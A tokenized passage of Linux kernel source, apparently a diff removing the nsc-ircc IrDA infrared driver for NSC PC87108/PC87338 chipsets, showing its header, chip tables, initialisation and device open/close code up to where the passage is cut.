")", ";", "static", "void", "mcs_send_irq", "(", "struct", "urb", "*", "urb", ")", ";", "static", "netdev_tx_t", "mcs_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "netdev", ")", ";", "static", "int", "mcs_probe", "(", "struct", "usb_interface", "*", "intf", ",", "const", "struct", "usb_device_id", "*", "id", ")", ";", "static", "void", "mcs_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", ";", "#", "endif", "/", "*", "_MCS7780_H", "*", "/", "@", "@", "-", "1", ",", "2410", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "nsc", "-", "ircc", ".", "c", "*", "Version", ":", "1", ".", "0", "*", "Description", ":", "Driver", "for", "the", "NSC", "PC", "'", "108", "and", "PC", "'", "338", "IrDA", "chipsets", "*", "Status", ":", "Stable", ".", "*", "Author", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Created", "at", ":", "Sat", "Nov", "7", "21", ":", "43", ":", "15", "1998", "*", "Modified", "at", ":", "Wed", "Mar", "1", "11", ":", "29", ":", "34", "2000", "*", "Modified", "by", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "*", "Copyright", "(", "c", ")", "1998", "-", "2000", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Copyright", "(", "c", ")", "1998", "Lichen", "Wang", ",", "<", "lwang", "@", "actisys", ".", "com", ">", "*", "Copyright", "(", "c", ")", "1998", "Actisys", "Corp", ".", ",", "www", ".", "actisys", ".", "com", "*", "Copyright", "(", "c", ")", "2000", "-", "2004", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "*", "All", "Rights", "Reserved", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "Neither", "Dag", "Brattli", "nor", "University", "of", "Troms", "\u00f8", "admit", "liability", "nor", "*", "provide", "warranty", "for", "any", "of", "this", "software", ".", "This", "material", "is", "*", "provided", "\"", "AS", "-", "IS", "\"", "and", "at", "no", "charge", ".", "*", "*", "Notice", "that", "all", "functions", "that", "needs", "to", "access", "the", "chip", "in", "_any_", "*", "way", ",", "must", "save", "BSR", "register", "on", "entry", ",", "and", "restore", "it", "on", "exit", ".", "*", "It", "is", "_very_", "important", "to", "follow", "this", "policy", "!", "*", "*", "__u8", "bank", ";", "*", "*", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "*", "*", "do_your_stuff_here", "(", ");", "*", "*", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "*", "*", "If", "you", "find", "bugs", "in", "this", "file", ",", "its", "very", "likely", "that", "the", "same", "bug", "*", "will", "also", "be", "in", "w83977af_ir", ".", "c", "since", "the", "implementations", "are", "quite", "*", "similar", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "gfp", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "skbuff", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "ioport", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "rtnetlink", ".", "h", ">", "#", "include", "<", "linux", "/", "dma", "-", "mapping", ".", "h", ">", "#", "include", "<", "linux", "/", "pnp", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_device", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "#", "include", "<", "asm", "/", "dma", ".", "h", ">", "#", "include", "<", "asm", "/", "byteorder", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "\"", "nsc", "-", "ircc", ".", "h", "\"", "#", "define", "CHIP_IO_EXTENT", "8", "#", "define", "BROKEN_DONGLE_ID", "static", "char", "*", "driver_name", "=", "\"", "nsc", "-", "ircc", "\"", ";", "/", "*", "Power", "Management", "*", "/", "#", "define", "NSC_IRCC_DRIVER_NAME", "\"", "nsc", "-", "ircc", "\"", "static", "int", "nsc_ircc_suspend", "(", "struct", "platform_device", "*", "dev", ",", "pm_message_t", "state", ")", ";", "static", "int", "nsc_ircc_resume", "(", "struct", "platform_device", "*", "dev", ")", ";", "static", "struct", "platform_driver", "nsc_ircc_driver", "=", "{", ".", "suspend", "=", "nsc_ircc_suspend", ",", ".", "resume", "=", "nsc_ircc_resume", ",", ".", "driver", "=", "{", ".", "name", "=", "NSC_IRCC_DRIVER_NAME", ",", "}", ",", "}", ";", "/", "*", "Module", "parameters", "*", "/", "static", "int", "qos_mtt_bits", "=", "0x07", ";", "/", "*", "1", "ms", "or", "more", "*", "/", "static", "int", "dongle_id", ";", "/", "*", "Use", "BIOS", "settions", "by", "default", ",", "but", "user", "may", "supply", "module", "parameters", "*", "/", "static", "unsigned", "int", "io", "[", "]", "=", "{", "~", "0", ",", "~", "0", ",", "~", "0", ",", "~", "0", ",", "~", "0", "}", ";", "static", "unsigned", "int", "irq", "[", "]", "=", "{", "0", ",", "0", ",", "0", ",", "0", ",", "0", "}", ";", "static", "unsigned", "int", "dma", "[", "]", "=", "{", "0", ",", "0", ",", "0", ",", "0", ",", "0", "}", ";", "static", "int", "nsc_ircc_probe_108", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "nsc_ircc_probe_338", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "nsc_ircc_probe_39x", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "nsc_ircc_init_108", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "nsc_ircc_init_338", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "nsc_ircc_init_39x", "(", "nsc_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "#", "ifdef", "CONFIG_PNP", "static", "int", "nsc_ircc_pnp_probe", "(", "struct", "pnp_dev", "*", "dev", ",", "const", "struct", "pnp_device_id", "*", "id", ")", ";", "#", "endif", "/", "*", "These", "are", "the", "known", "NSC", "chips", "*", "/", "static", "nsc_chip_t", "chips", "[", "]", "=", "{", "/", "*", "Name", ",", "{", "cfg", "registers", "}", ",", "chip", "id", "index", "reg", ",", "chip", "id", "expected", "value", ",", "revision", "mask", "*", "/", "{", "\"", "PC87108", "\"", ",", "{", "0x150", ",", "0x398", ",", "0xea", "}", ",", "0x05", ",", "0x10", ",", "0xf0", ",", "nsc_ircc_probe_108", ",", "nsc_ircc_init_108", "}", ",", "{", "\"", "PC87338", "\"", ",", "{", "0x398", ",", "0x15c", ",", "0x2e", "}", ",", "0x08", ",", "0xb0", ",", "0xf8", ",", "nsc_ircc_probe_338", ",", "nsc_ircc_init_338", "}", ",", "/", "*", "Contributed", "by", "Steffen", "Pingel", "-", "IBM", "X40", "*", "/", "{", "\"", "PC8738x", "\"", ",", "{", "0x164e", ",", "0x4e", ",", "0x2e", "}", ",", "0x20", ",", "0xf4", ",", "0xff", ",", "nsc_ircc_probe_39x", ",", "nsc_ircc_init_39x", "}", ",", "/", "*", "Contributed", "by", "Jan", "Frey", "-", "IBM", "A30", "/", "A31", "*", "/", "{", "\"", "PC8739x", "\"", ",", "{", "0x2e", ",", "0x4e", ",", "0x0", "}", ",", "0x20", ",", "0xea", ",", "0xff", ",", "nsc_ircc_probe_39x", ",", "nsc_ircc_init_39x", "}", ",", "/", "*", "IBM", "ThinkPads", "using", "PC8738x", "(", "T60", "/", "X60", "/", "Z60", ")", "*", "/", "{", "\"", "IBM", "-", "PC8738x", "\"", ",", "{", "0x2e", ",", "0x4e", ",", "0x0", "}", ",", "0x20", ",", "0xf4", ",", "0xff", ",", "nsc_ircc_probe_39x", ",", "nsc_ircc_init_39x", "}", ",", "/", "*", "IBM", "ThinkPads", "using", "PC8394T", "(", "T43", "/", "R52", "/", "?)", "*", "/", "{", "\"", "IBM", "-", "PC8394T", "\"", ",", "{", "0x2e", ",", "0x4e", ",", "0x0", "}", ",", "0x20", ",", "0xf9", ",", "0xff", ",", "nsc_ircc_probe_39x", ",", "nsc_ircc_init_39x", "}", ",", "{", "NULL", "}", "}", ";", "static", "struct", "nsc_ircc_cb", "*", "dev_self", "[", "]", "=", "{", "NULL", ",", "NULL", ",", "NULL", ",", "NULL", ",", "NULL", "}", ";", "static", "char", "*", "dongle_types", "[", "]", "=", "{", "\"", "Differential", "serial", "interface", "\"", ",", "\"", "Differential", "serial", "interface", "\"", ",", "\"", "Reserved", "\"", ",", "\"", "Reserved", "\"", ",", "\"", "Sharp", "RY5HD01", "\"", ",", "\"", "Reserved", "\"", ",", "\"", "Single", "-", "ended", "serial", "interface", "\"", ",", "\"", "Consumer", "-", "IR", "only", "\"", ",", "\"", "HP", "HSDL", "-", "2300", ",", "HP", "HSDL", "-", "3600", "/", "HSDL", "-", "3610", "\"", ",", "\"", "IBM31T1100", "or", "Temic", "TFDS6000", "/", "TFDS6500", "\"", ",", "\"", "Reserved", "\"", ",", "\"", "Reserved", "\"", ",", "\"", "HP", "HSDL", "-", "1100", "/", "HSDL", "-", "2100", "\"", ",", "\"", "HP", "HSDL", "-", "1100", "/", "HSDL", "-", "2100", "\"", ",", "\"", "Supports", "SIR", "Mode", "only", "\"", ",", "\"", "No", "dongle", "connected", "\"", ",", "}", ";", "/", "*", "PNP", "probing", "*", "/", "static", "chipio_t", "pnp_info", ";", "static", "const", "struct", "pnp_device_id", "nsc_ircc_pnp_table", "[", "]", "=", "{", "{", ".", "id", "=", "\"", "NSC6001", "\"", ",", ".", "driver_data", "=", "0", "}", ",", "{", ".", "id", "=", "\"", "HWPC224", "\"", ",", ".", "driver_data", "=", "0", "}", ",", "{", ".", "id", "=", "\"", "IBM0071", "\"", ",", ".", "driver_data", "=", "NSC_FORCE_DONGLE_TYPE9", "}", ",", "{", "}", "}", ";", "MODULE_DEVICE_TABLE", "(", "pnp", ",", "nsc_ircc_pnp_table", ")", ";", "static", "struct", "pnp_driver", "nsc_ircc_pnp_driver", "=", "{", "#", "ifdef", "CONFIG_PNP", ".", "name", "=", "\"", "nsc", "-", "ircc", "\"", ",", ".", "id_table", "=", "nsc_ircc_pnp_table", ",", ".", "probe", "=", "nsc_ircc_pnp_probe", ",", "#", "endif", "}", ";", "/", "*", "Some", "prototypes", "*", "/", "static", "int", "nsc_ircc_open", "(", "chipio_t", "*", "info", ")", ";", "static", "int", "nsc_ircc_close", "(", "struct", "nsc_ircc_cb", "*", "self", ")", ";", "static", "int", "nsc_ircc_setup", "(", "chipio_t", "*", "info", ")", ";", "static", "void", "nsc_ircc_pio_receive", "(", "struct", "nsc_ircc_cb", "*", "self", ")", ";", "static", "int", "nsc_ircc_dma_receive", "(", "struct", "nsc_ircc_cb", "*", "self", ")", ";", "static", "int", "nsc_ircc_dma_receive_complete", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "int", "iobase", ")", ";", "static", "netdev_tx_t", "nsc_ircc_hard_xmit_sir", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", ";", "static", "netdev_tx_t", "nsc_ircc_hard_xmit_fir", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "nsc_ircc_pio_write", "(", "int", "iobase", ",", "__u8", "*", "buf", ",", "int", "len", ",", "int", "fifo_size", ")", ";", "static", "void", "nsc_ircc_dma_xmit", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "int", "iobase", ")", ";", "static", "__u8", "nsc_ircc_change_speed", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "__u32", "baud", ")", ";", "static", "int", "nsc_ircc_is_receiving", "(", "struct", "nsc_ircc_cb", "*", "self", ")", ";", "static", "int", "nsc_ircc_read_dongle_id", "(", "int", "iobase", ")", ";", "static", "void", "nsc_ircc_init_dongle_interface", "(", "int", "iobase", ",", "int", "dongle_id", ")", ";", "static", "int", "nsc_ircc_net_open", "(", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "nsc_ircc_net_close", "(", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "nsc_ircc_net_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", ";", "/", "*", "Globals", "*", "/", "static", "int", "pnp_registered", ";", "static", "int", "pnp_succeeded", ";", "/", "*", "*", "Function", "nsc_ircc_init", "(", ")", "*", "*", "Initialize", "chip", ".", "Just", "try", "to", "find", "out", "how", "many", "chips", "we", "are", "dealing", "with", "*", "and", "where", "they", "are", "*", "/", "static", "int", "__init", "nsc_ircc_init", "(", "void", ")", "{", "chipio_t", "info", ";", "nsc_chip_t", "*", "chip", ";", "int", "ret", ";", "int", "cfg_base", ";", "int", "cfg", ",", "id", ";", "int", "reg", ";", "int", "i", "=", "0", ";", "ret", "=", "platform_driver_register", "(", "&", "nsc_ircc_driver", ")", ";", "if", "(", "ret", ")", "{", "net_err_ratelimited", "(", "\"%", "s", ",", "Can", "'", "t", "register", "driver", "!", "\\", "n", "\"", ",", "driver_name", ")", ";", "return", "ret", ";", "}", "/", "*", "Register", "with", "PnP", "subsystem", "to", "detect", "disable", "ports", "*", "/", "ret", "=", "pnp_register_driver", "(", "&", "nsc_ircc_pnp_driver", ")", ";", "if", "(", "!", "ret", ")", "pnp_registered", "=", "1", ";", "ret", "=", "-", "ENODEV", ";", "/", "*", "Probe", "for", "all", "the", "NSC", "chipsets", "we", "know", "about", "*", "/", "for", "(", "chip", "=", "chips", ";", "chip", "-", ">", "name", ";", "chip", "+", "+)", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Probing", "for", "%", "s", ".", "..", "\\", "n", "\"", ",", "__func__", ",", "chip", "-", ">", "name", ")", ";", "/", "*", "Try", "all", "config", "registers", "for", "this", "chip", "*", "/", "for", "(", "cfg", "=", "0", ";", "cfg", "<", "ARRAY_SIZE", "(", "chip", "-", ">", "cfg", ")", ";", "cfg", "+", "+)", "{", "cfg_base", "=", "chip", "-", ">", "cfg", "[", "cfg", "]", ";", "if", "(", "!", "cfg_base", ")", "continue", ";", "/", "*", "Read", "index", "register", "*", "/", "reg", "=", "inb", "(", "cfg_base", ")", ";", "if", "(", "reg", "=", "=", "0xff", ")", "{", "pr_debug", "(", "\"%", "s", "(", ")", "no", "chip", "at", "0x", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "cfg_base", ")", ";", "continue", ";", "}", "/", "*", "Read", "chip", "identification", "register", "*", "/", "outb", "(", "chip", "-", ">", "cid_index", ",", "cfg_base", ")", ";", "id", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "if", "(", "(", "id", "&", "chip", "-", ">", "cid_mask", ")", "=", "=", "chip", "-", ">", "cid_value", ")", "{", "pr_debug", "(", "\"%", "s", "(", ")", "Found", "%", "s", "chip", ",", "revision", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "chip", "-", ">", "name", ",", "id", "&", "~", "chip", "-", ">", "cid_mask", ")", ";", "/", "*", "*", "If", "we", "found", "a", "correct", "PnP", "setting", ",", "*", "we", "first", "try", "it", ".", "*", "/", "if", "(", "pnp_succeeded", ")", "{", "memset", "(", "&", "info", ",", "0", ",", "sizeof", "(", "chipio_t", ")", ");", "info", ".", "cfg_base", "=", "cfg_base", ";", "info", ".", "fir_base", "=", "pnp_info", ".", "fir_base", ";", "info", ".", "dma", "=", "pnp_info", ".", "dma", ";", "info", ".", "irq", "=", "pnp_info", ".", "irq", ";", "if", "(", "info", ".", "fir_base", "<", "0x2000", ")", "{", "net_info_ratelimited", "(", "\"%", "s", ",", "chip", "-", ">", "init", "\\", "n", "\"", ",", "driver_name", ")", ";", "chip", "-", ">", "init", "(", "chip", ",", "&", "info", ")", ";", "}", "else", "chip", "-", ">", "probe", "(", "chip", ",", "&", "info", ")", ";", "if", "(", "nsc_ircc_open", "(", "&", "info", ")", ">", "=", "0", ")", "ret", "=", "0", ";", "}", "/", "*", "*", "Opening", "based", "on", "PnP", "values", "failed", ".", "*", "Let", "'", "s", "fallback", "to", "user", "values", ",", "or", "probe", "*", "the", "chip", ".", "*", "/", "if", "(", "ret", ")", "{", "pr_debug", "(", "\"%", "s", ",", "PnP", "init", "failed", "\\", "n", "\"", ",", "driver_name", ")", ";", "memset", "(", "&", "info", ",", "0", ",", "sizeof", "(", "chipio_t", ")", ");", "info", ".", "cfg_base", "=", "cfg_base", ";", "info", ".", "fir_base", "=", "io", "[", "i", "]", ";", "info", ".", "dma", "=", "dma", "[", "i", "]", ";", "info", ".", "irq", "=", "irq", "[", "i", "]", ";", "/", "*", "*", "If", "the", "user", "supplies", "the", "base", "address", ",", "then", "*", "we", "init", "the", "chip", ",", "if", "not", "we", "probe", "the", "values", "*", "set", "by", "the", "BIOS", "*", "/", "if", "(", "io", "[", "i", "]", "<", "0x2000", ")", "{", "chip", "-", ">", "init", "(", "chip", ",", "&", "info", ")", ";", "}", "else", "chip", "-", ">", "probe", "(", "chip", ",", "&", "info", ")", ";", "if", "(", "nsc_ircc_open", "(", "&", "info", ")", ">", "=", "0", ")", "ret", "=", "0", ";", "}", "i", "+", "+;", "}", "else", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Wrong", "chip", "id", "=", "0x", "%", "02x", "\\", "n", "\"", ",", "__func__", ",", "id", ")", ";", "}", "}", "}", "if", "(", "ret", ")", "{", "platform_driver_unregister", "(", "&", "nsc_ircc_driver", ")", ";", "pnp_unregister_driver", "(", "&", "nsc_ircc_pnp_driver", ")", ";", "pnp_registered", "=", "0", ";", "}", "return", "ret", ";", "}", "/", "*", "*", "Function", "nsc_ircc_cleanup", "(", ")", "*", "*", "Close", "all", "configured", "chips", "*", "*", "/", "static", "void", "__exit", "nsc_ircc_cleanup", "(", "void", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "ARRAY_SIZE", "(", "dev_self", ")", ";", "i", "+", "+)", "{", "if", "(", "dev_self", "[", "i", "]", ")", "nsc_ircc_close", "(", "dev_self", "[", "i", "]", ");", "}", "platform_driver_unregister", "(", "&", "nsc_ircc_driver", ")", ";", "if", "(", "pnp_registered", ")", "pnp_unregister_driver", "(", "&", "nsc_ircc_pnp_driver", ")", ";", "pnp_registered", "=", "0", ";", "}", "static", "const", "struct", "net_device_ops", "nsc_ircc_sir_ops", "=", "{", ".", "ndo_open", "=", "nsc_ircc_net_open", ",", ".", "ndo_stop", "=", "nsc_ircc_net_close", ",", ".", "ndo_start_xmit", "=", "nsc_ircc_hard_xmit_sir", ",", ".", "ndo_do_ioctl", "=", "nsc_ircc_net_ioctl", ",", "}", ";", "static", "const", "struct", "net_device_ops", "nsc_ircc_fir_ops", "=", "{", ".", "ndo_open", "=", "nsc_ircc_net_open", ",", ".", "ndo_stop", "=", "nsc_ircc_net_close", ",", ".", "ndo_start_xmit", "=", "nsc_ircc_hard_xmit_fir", ",", ".", "ndo_do_ioctl", "=", "nsc_ircc_net_ioctl", ",", "}", ";", "/", "*", "*", "Function", "nsc_ircc_open", "(", "iobase", ",", "irq", ")", "*", "*", "Open", "driver", "instance", "*", "*", "/", "static", "int", "__init", "nsc_ircc_open", "(", "chipio_t", "*", "info", ")", "{", "struct", "net_device", "*", "dev", ";", "struct", "nsc_ircc_cb", "*", "self", ";", "void", "*", "ret", ";", "int", "err", ",", "chip_index", ";", "for", "(", "chip_index", "=", "0", ";", "chip_index", "<", "ARRAY_SIZE", "(", "dev_self", ")", ";", "chip_index", "+", "+)", "{", "if", "(", "!", "dev_self", "[", "chip_index", "]", ")", "break", ";", "}", "if", "(", "chip_index", "=", "=", "ARRAY_SIZE", "(", "dev_self", ")", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "maximum", "number", "of", "supported", "chips", "reached", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", "-", "ENOMEM", ";", "}", "net_info_ratelimited", "(", "\"%", "s", ",", "Found", "chip", "at", "base", "=", "0x", "%", "03x", "\\", "n", "\"", ",", "driver_name", ",", "info", "-", ">", "cfg_base", ")", ";", "if", "(", "(", "nsc_ircc_setup", "(", "info", ")", ")", "=", "=", "-", "1", ")", "return", "-", "1", ";", "net_info_ratelimited", "(", "\"%", "s", ",", "driver", "loaded", "(", "Dag", "Brattli", ")", "\\", "n", "\"", ",", "driver_name", ")", ";", "dev", "=", "alloc_irdadev", "(", "sizeof", "(", "struct", "nsc_ircc_cb", ")", ");", "if", "(", "dev", "=", "=", "NULL", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "can", "'", "t", "allocate", "memory", "for", "control", "block", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", "-", "ENOMEM", ";", "}", "self", "=", "netdev_priv", "(", "dev", ")", ";", "self", "-", ">", "netdev", "=", "dev", ";", "spin_lock_init", "(", "&", "self", "-", ">", "lock", ")", ";", "/", "*", "Need", "to", "store", "self", "somewhere", "*", "/", "dev_self", "[", "chip_index", "]", "=", "self", ";", "self", "-", ">", "index", "=", "chip_index", ";", "/", "*", "Initialize", "IO", "*", "/", "self", "-", ">", "io", ".", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "self", "-", ">", "io", ".", "fir_base", "=", "info", "-", ">", "fir_base", ";", "self", "-", ">", "io", ".", "irq", "=", "info", "-", ">", "irq", ";", "self", "-", ">", "io", ".", "fir_ext", "=", "CHIP_IO_EXTENT", ";", "self", "-", ">", "io", ".", "dma", "=", "info", "-", ">", "dma", ";", "self", "-", ">", "io", ".", "fifo_size", "=", "32", ";", "/", "*", "Reserve", "the", "ioports", "that", "we", "need", "*", "/", "ret", "=", "request_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ",", "driver_name", ")", ";", "if", "(", "!", "ret", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "can", "'", "t", "get", "iobase", "of", "0x", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "io", ".", "fir_base", ")", ";", "err", "=", "-", "ENODEV", ";", "goto", "out1", ";", "}", "/", "*", "Initialize", "QoS", "for", "this", "device", "*", "/", "irda_init_max_qos_capabilies", "(", "&", "self", "-", ">", "qos", ")", ";", "/", "*", "The", "only", "value", "we", "must", "override", "it", "the", "baudrate", "*", "/", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", "|", "IR_576000", "|", "IR_1152000", "|", "(", "IR_4000000", "<", "<", "8", ")", ";", "self", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "qos_mtt_bits", ";", "irda_qos_bits_to_value", "(", "&", "self", "-", ">", "qos", ")", ";", "/", "*", "Max", "DMA", "buffer", "size", "needed", "=", "(", "data_size", "+", "6", ")", "*", "(", "window_size", ")", "+", "6", ";", "*", "/", "self", "-", ">", "rx_buff", ".", "truesize", "=", "14384", ";", "self", "-", ">", "tx_buff", ".", "truesize", "=", "14384", ";", "/", "*", "Allocate", "memory", "if", "needed", "*", "/", "self", "-", ">", "rx_buff", ".", "head", "=", "dma_zalloc_coherent", "(", "NULL", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "&", "self", "-", ">", "rx_buff_dma", ",", "GFP_KERNEL", ")", ";", "if", "(", "self", "-", ">", "rx_buff", ".", "head", "=", "=", "NULL", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "out2", ";", "}", "self", "-", ">", "tx_buff", ".", "head", "=", "dma_zalloc_coherent", "(", "NULL", ",", "self", "-", ">", "tx_buff", ".", "truesize", ",", "&", "self", "-", ">", "tx_buff_dma", ",", "GFP_KERNEL", ")", ";", "if", "(", "self", "-", ">", "tx_buff", ".", "head", "=", "=", "NULL", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "out3", ";", "}", "self", "-", ">", "rx_buff", ".", "in_frame", "=", "FALSE", ";", "self", "-", ">", "rx_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "self", "-", ">", "tx_buff", ".", "data", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "self", "-", ">", "rx_buff", ".", "data", "=", "self", "-", ">", "rx_buff", ".", "head", ";", "/", "*", "Reset", "Tx", "queue", "info", "*", "/", "self", "-", ">", "tx_fifo", ".", "len", "=", "self", "-", ">", "tx_fifo", ".", "ptr", "=", "self", "-", ">", "tx_fifo", ".", "free", "=", "0", ";", "self", "-", ">", "tx_fifo", ".", "tail", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "/", "*", "Override", "the", "network", "functions", "we", "need", "to", "use", "*", "/", "dev", "-", ">", "netdev_ops", "=", "&", "nsc_ircc_sir_ops", ";", "err", "=", "register_netdev", "(", "dev", ")", ";", "if", "(", "err", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "register_netdev", "(", ")", "failed", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "goto", "out4", ";", "}", "net_info_ratelimited", "(", "\"", "IrDA", ":", "Registered", "device", "%", "s", "\\", "n", "\"", ",", "dev", "-", ">", "name", ")", ";", "/", "*", "Check", "if", "user", "has", "supplied", "a", "valid", "dongle", "id", "or", "not", "*", "/", "if", "(", "(", "dongle_id", "<", "=", "0", ")", "|", "|", "(", "dongle_id", ">", "=", "ARRAY_SIZE", "(", "dongle_types", ")", "))", "{", "dongle_id", "=", "nsc_ircc_read_dongle_id", "(", "self", "-", ">", "io", ".", "fir_base", ")", ";", "net_info_ratelimited", "(", "\"%", "s", ",", "Found", "dongle", ":", "%", "s", "\\", "n", "\"", ",", "driver_name", ",", "dongle_types", "[", "dongle_id", "]", ");", "}", "else", "{", "net_info_ratelimited", "(", "\"%", "s", ",", "Using", "dongle", ":", "%", "s", "\\", "n", "\"", ",", "driver_name", ",", "dongle_types", "[", "dongle_id", "]", ");", "}", "self", "-", ">", "io", ".", "dongle_id", "=", "dongle_id", ";", "nsc_ircc_init_dongle_interface", "(", "self", "-", ">", "io", ".", "fir_base", ",", "dongle_id", ")", ";", "self", "-", ">", "pldev", "=", "platform_device_register_simple", "(", "NSC_IRCC_DRIVER_NAME", ",", "self", "-", ">", "index", ",", "NULL", ",", "0", ")", ";", "if", "(", "IS_ERR", "(", "self", "-", ">", "pldev", ")", ")", "{", "err", "=", "PTR_ERR", "(", "self", "-", ">", "pldev", ")", ";", "goto", "out5", ";", "}", "platform_set_drvdata", "(", "self", "-", ">", "pldev", ",", "self", ")", ";", "return", "chip_index", ";", "out5", ":", "unregister_netdev", "(", "dev", ")", ";", "out4", ":", "dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "tx_buff", ".", "truesize", ",", "self", "-", ">", "tx_buff", ".", "head", ",", "self", "-", ">", "tx_buff_dma", ")", ";", "out3", ":", "dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "self", "-", ">", "rx_buff", ".", "head", ",", "self", "-", ">", "rx_buff_dma", ")", ";", "out2", ":", "release_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ")", ";", "out1", ":", "free_netdev", "(", "dev", ")", ";", "dev_self", "[", "chip_index", "]", "=", "NULL", ";", "return", "err", ";", "}", "/", "*", "*", "Function", "nsc_ircc_close", "(", "self", ")", "*", "*", "Close", "driver", "instance", "*", "*", "/", "static", "int", "__exit", "nsc_ircc_close", "(", "struct", "nsc_ircc_cb", "*", "self", ")", "{", "int", "iobase", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "platform_device_unregister", "(", "self", "-", ">", "pldev", ")", ";", "/", "*", "Remove", "netdevice", "*", "/", "unregister_netdev", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Release", "the", "PORT", "that", "this", "driver", "is", "using", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "Releasing", "Region", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "io", ".", "fir_base", ")", ";", "release_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ")", ";", "if", "(", "self", "-", ">", "tx_buff", ".", "head", ")", "dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "tx_buff", ".", "truesize", ",", "self", "-", ">", "tx_buff", ".", "head", ",", "self", "-", ">", "tx_buff_dma", ")", ";", "if", "(", "self", "-", ">", "rx_buff", ".", "head", ")", 